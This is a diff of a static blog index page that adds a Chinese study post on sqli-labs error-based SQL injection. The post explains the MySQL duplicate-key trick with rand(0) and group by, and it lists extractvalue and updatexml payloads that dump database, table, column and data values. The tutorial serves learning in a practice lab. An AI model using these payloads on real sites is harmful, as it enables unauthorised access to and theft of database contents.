@@ -63,7 +63,7 @@
     <h1 class="page-type-title"></h1>
     
     
-    <article id="post-sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题" class="article article-type-post" itemscope
+    <article id="post-“sql-labs报错注入”" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -72,7 +72,7 @@
       
 
 <h2 itemprop="name">
-  <a class="article-title" href="/2021/10/12/sqlilab%E7%9A%84%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89%E5%92%8C%E7%AC%AC%E4%BA%8C%E9%A2%98/">sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题</a>
+  <a class="article-title" href="/2021/10/16/%E2%80%9Csql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%9D/">“sql-labs报错注入”</a>
 </h2>
 
 
@@ -82,7 +82,111 @@
 
     
     <div class="article-meta">
-      <a href="/2021/10/12/sqlilab%E7%9A%84%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89%E5%92%8C%E7%AC%AC%E4%BA%8C%E9%A2%98/" class="article-date">
+      <a href="/2021/10/16/%E2%80%9Csql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%9D/" class="article-date">
+  <time datetime="2021-10-16T08:31:46.000Z" itemprop="datePublished">2021-10-16</time>
+</a>
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+        
+      
+      
+      <h2 id="sql报错注入"><a href="#sql报错注入" class="headerlink" title="sql报错注入"></a>sql报错注入</h2><pre><code> 使用场景:用于没有回显信息时，但有报错信息时使用。
+</code></pre>
+<p>​     报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p>
+<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p>
+<h3 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group by()导致主键重复"></a>concat+rand()+group by()导致主键重复</h3><p>该方法的关键在于group by</p>
+<h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p>
+<p>group by 语句形成的字段是主键</p>
+<p><code>主键定义</code></p>
+<ul>
+<li><p><code>每个表只能定义一个主键。</code></p>
+</li>
+<li><p><code>主键值必须唯一标识表中的每一行，且不能为 NULL，即表中不可能存在有相同主键值的两行数据。这是唯一性原则。</code></p>
+</li>
+<li><p><code>一个字段名只能在联合主键字段表中出现一次。</code></p>
+</li>
+<li><p><code>联合主键不能包含不必要的多余字段。当把联合主键的某一字段删除后，如果剩下的字段构成的主键仍然满足唯一性原则，那么这个联合主键是不正确的。这是最小化原则。</code></p>
+<p>而我这次报错注入利用的原理就是这个。</p>
+<p>利用主键的行名无法重复，如果重复系统会报错出重复的行名</p>
+<p>我们可以利用这个方法把需要的信息通过报错显示出来。</p>
+<p>可以用insert 来测试。</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211019203424502.png" alt="image-20211019203424502"></p>
+</li>
+</ul>
+<p>使用group by语句时和count()函数，mysql数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已经存在该键，则找到该键对应的计数字段并加一，group by语句会执行两次语句，一次在检测的时候，一次在插入的时候。（sql报错注入group by语句和count()函数需要一起使用才会报错   ps我还不知道为什么，我觉的是因为count()函数）</p>
+<p>由于我们使用了rand(0)，在查询虚拟表之前先执行一下rand(0),第一次的到的结果为0，发现虚拟表中没有，所以此时插入键0，而在插入时，rand(0)函数会再执行一次，而此时查询的结果为1。所以实际插入进去的键名是1。第二次插入时，执行rand(0)函数，得到的结果为1，发现为1，不会插入函数（group by语句只会再插入时再执行一次语句），所以这次没有插入，只是找到该键对应的计数字段并加一，第三次插入时，执行rand(0),而此时查询的结果为0，查询虚拟表发现没有，进行插入，而再插入时会再执行rand(0),导致0变1，这就会于原先虚拟表中的1键名重复，此时报错出重复的键名。</p>
+<p>(rand(0)于rand()不同出就是rand(0)每次执行的结果都是一样的，rand()不是)</p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211019211215828.png" alt="image-20211019211215828"></p>
+<p><img src="C:\Users\夜风\AppData\Roaming\Typora\typora-user-images\image-20211019211244289.png" alt="image-20211019211244289"></p>
+<p>rand()：</p>
+<p><code>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</code></p>
+<p>floor()：</p>
+<p><code>对任意正或者负的十进制值向下取整</code></p>
+<p><code>通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数</code></p>
+<p>通用公式</p>
+<p><code>select count(*),concat((要查询的语句),floor(rand(0)*2)) as a from information_schema.tables  group by a</code></p>
+<h2 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h2><p>函数原型：extractvalue(xml_document,Xpath_string)<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p>
+<p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p>
+<p>pyload：id=’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p>
+<p>例如：</p>
+<p><code>id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</code><br><code>id=&#39;and(select extractvalue(1,concat(0x7e,@@version)))</code></p>
+<p>针对mysql数据库：</p>
+<p><code>查数据库名：id=&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</code><br><code>爆表名：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</code><br><code>爆字段名：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</code><br><code>爆数据：id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</code></p>
+<p>注：</p>
+<p> ① 0x7e=’<del>’<br> ② concat(‘a’,‘b’)=“ab”<br> ③ version()=@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p><code>函数原型：updatexml(xml_document,xpath_string,new_value)</code><br><code>正常语法：updatexml(xml_document,xpath_string,new_value)</code><br><code>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串</code><br>`第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值``</p>
+<p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：id=’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p>
+<p>例如：</p>
+<p><code>&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</code><br><code>&#39;and(select updatexml(1,concat(0x7e,@@database),1))</code></p>
+<p>同样，针对mysql：</p>
+<p><code>爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</code><br><code>爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</code><br><code>爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</code><br><code>爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/10/16/%E2%80%9Csql-labs%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%9D/" data-id="ckuy6khfn000bistcgid44fdz" class="article-share-link">
+        Share
+      </a>
+      
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">sql报错注入</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+    
+    <article id="post-sqlilab1-4" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+      
+
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/10/12/sqlilab1-4/">sqlilab1-4</a>
+</h2>
+
+
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2021/10/12/sqlilab1-4/" class="article-date">
   <time datetime="2021-10-12T14:17:34.000Z" itemprop="datePublished">2021-10-12</time>
 </a>
       
@@ -97,10 +201,10 @@
         
       
       
-        <h1 id="sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题"><a href="#sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题" class="headerlink" title="sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题"></a>sqlilab的第一题（基于错误的GET单引号字符型注入）和第二题</h1><h3 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h3><p>　　SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库</p>
+        <h2 id="sqlilab的第一题（基于错误的GET单引号字符型注入）"><a href="#sqlilab的第一题（基于错误的GET单引号字符型注入）" class="headerlink" title="sqlilab的第一题（基于错误的GET单引号字符型注入）"></a>sqlilab的第一题（基于错误的GET单引号字符型注入）</h2><h3 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h3><p>　　SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库</p>
         
           <p>
-            <a class="article-more-link" href="/2021/10/12/sqlilab%E7%9A%84%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89%E5%92%8C%E7%AC%AC%E4%BA%8C%E9%A2%98/">
+            <a class="article-more-link" href="/2021/10/12/sqlilab1-4/">
               Read More...
             </a>
           </p>
@@ -108,7 +212,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/12/sqlilab%E7%9A%84%E7%AC%AC%E4%B8%80%E9%A2%98%EF%BC%88%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89%E5%92%8C%E7%AC%AC%E4%BA%8C%E9%A2%98/" data-id="ckutams5j0004v8tc6gia3iq8" class="article-share-link">
+      <a data-url="http://example.com/2021/10/12/sqlilab1-4/" data-id="ckuy6khfh0001istcdsjq0nql" class="article-share-link">
         Share
       </a>
       
@@ -162,7 +266,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/11/mysql%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckutams550000v8tcftz97w2d" class="article-share-link">
+      <a data-url="http://example.com/2021/10/11/mysql%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" data-id="ckuy6khfc0000istc1ayo4c7n" class="article-share-link">
         Share
       </a>
       
@@ -449,7 +553,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/07/php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckutams5g0001v8tc9es5gj5z" class="article-share-link">
+      <a data-url="http://example.com/2021/10/07/php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" data-id="ckuy6khfn000aistc9ib55wkp" class="article-share-link">
         Share
       </a>
       
@@ -513,7 +617,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/26/php%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" data-id="ckutams5h0002v8tcfysp55lp" class="article-share-link">
+      <a data-url="http://example.com/2021/09/26/php%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" data-id="ckuy6khfk0004istceo1ge75m" class="article-share-link">
         Share
       </a>
       
@@ -579,7 +683,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckutams5k0005v8tc5qqpgwkc" class="article-share-link">
+      <a data-url="http://example.com/2021/09/22/web%E5%AE%89%E5%85%A8-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckuy6khfi0002istc65wi88jw" class="article-share-link">
         Share
       </a>
       
